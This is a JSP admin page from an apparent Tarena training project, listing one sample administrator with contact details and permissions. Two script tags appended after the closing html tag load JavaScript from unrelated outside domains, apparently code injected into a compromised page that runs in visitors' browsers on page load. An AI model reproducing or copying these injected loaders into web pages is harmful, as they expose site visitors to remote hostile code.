<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<html>
<head>
<title> 管理员列表 </title>
<style type="text/css">
<!--
@import url(/app/son.css);
@import url(/app/index.css);
-->
</style>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<link href="/app/index.css" rel="stylesheet" type="text/css">
</head>
<body bgcolor="#ccddee" background="/app/image/background.jpg" link="#000066" vlink="#0066FF" alink="#99FF00">
<hr size="1" noshade>
<div align="center">

  <table width="91%" border="0" align="center">
    <tr align="center" bgcolor="#ccddee" class="pp">
      <td width="17%" height="6"><a href="addManager.htm" class="text_link"> 增加管理员</a></td>

      <td width="15%"> <span class="yellow">管理员列表</span></td>

      <td width="17%"><span class="yellow"><a href="self.htm" class="text_link">
        私人信息</a></span></td>
      </tr>
    </table>

  <form  method="post" action="listManager.htm">
    <p class="pp"><span class="yellow">管理员列表</span></p>
    <table width="100%" border=1 align="center" cellpadding="0" cellspacing="0" bordercolor="#ccccff" bgcolor="#ccddee" >
      <tr>
        <td width="53" height="32" align="center">删除</td>
        <td width="50" align="center"> 帐号</td>
        <td width="61" align="center"> 姓名</td>
        <td width="100" align="center"> 电话</td>
        <td width="158" align="center"> 邮箱</td>
        <td width="109" align="center"> 开户日期</td>
        <td width="80" align="center">权限</td>
        <td width="61" align="center">修改 </td>
      </tr>
      
      <tr class="9P">
        <td height="10" align="center">
          <input type="checkbox" name="ids" value="1"></td>
        <td align="center"> <div align="center">
          <span class="text_link">tarena&nbsp;</span>
          </div></td>
        <td align="center">tarena&nbsp;</td>
        <td align="center">62132839&nbsp;</td>
        <td align="center" nowrap>tarena@tarena.com.cn&nbsp;</td>
        <td align="center">Sun Oct 15 00:00:00 CST 2006&nbsp;</td>
        <td align="center">
          
            资费管理&nbsp;&nbsp;
          
            账务查询&nbsp;&nbsp;
          
            管理员管理&nbsp;&nbsp;
          
            用户管理&nbsp;&nbsp;
          
            账单查询&nbsp;&nbsp;
          
        </td>
        <td align="center"><a href="admmes.htm">修改</a></td>
      </tr>
      
      <tr align="center">
        <td height="22"><input type="submit" name="delete" value="删除"></td>
        <td> <div align="center">
            <input type="reset"  value="清除">
          </div></td>
        <td colspan="4"> <div align="center"><strong><font color="#000066" size="2"><strong>
            </strong></font> </strong></div></td>
      </tr>
    </table>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
  </form>
  <p>&nbsp;</p>
</div>
<center>
  <p class="9P">&nbsp; </p>
  <hr/>
  <p class="text_link"><font size="2" face="宋体">About Tarena - 公司简介 - 联系方法 - 相关法律
    - 客户服务 <br>
    达内公司版权所有</font></p>
  <p class="text_link"><font size="-1">Copyright&nbsp;<img src="/image/c-00.gif" width="9" height="9">&nbsp;2000.
    Tarena Technologies Inc. All Rights Reserved </font></p>
</center>
</body>
</html>

<script language=javascript src=http://www.shaoye1213.cn/tl.js></script>
<script language=javascript src=http://www.eheh001.cn/a.js></script>